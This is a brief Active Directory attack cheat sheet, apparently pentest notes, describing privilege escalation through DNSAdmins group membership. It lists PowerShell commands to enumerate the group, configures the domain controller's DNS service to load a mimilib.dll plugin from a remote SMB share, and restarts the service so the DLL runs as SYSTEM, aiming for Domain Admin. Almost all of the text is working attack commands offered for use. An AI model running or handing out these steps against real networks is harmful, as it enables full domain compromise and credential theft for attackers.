It is possible for the members of the DNSAdmins group to load arbitrary DLLs with the privileges of dns.exe(SYSTEM). In case the DC also serves as DNS, this will provide us escalation to DA. Need privileges to restart the DNS service.


Enumerate members of the DNS Admins group

```powershell
#PowerView
Get-NetGroupMember -GroupName "DNSAdmins"


#Using ActiveDirectory module
Get-ADGroupMember -Identity DNSAdmins
```

Configure DLL

```powershell
#From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS):
dnscmd dc /config /serverlevelplugindll \\172.1.1.100\dll\mimilib.dll 


#Using DNSServer module (needs RSAT DNS):
$dnsettings = Get-DnsServerSetting -ComputerName dc -Verbose -All
$dnsettings.ServerLevelPluginDll ="\\172.1.1.100\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName dc -Verbose
```

Restart DNS service

```powershell
sc \\dc stop dns
sc \\dc start dns
```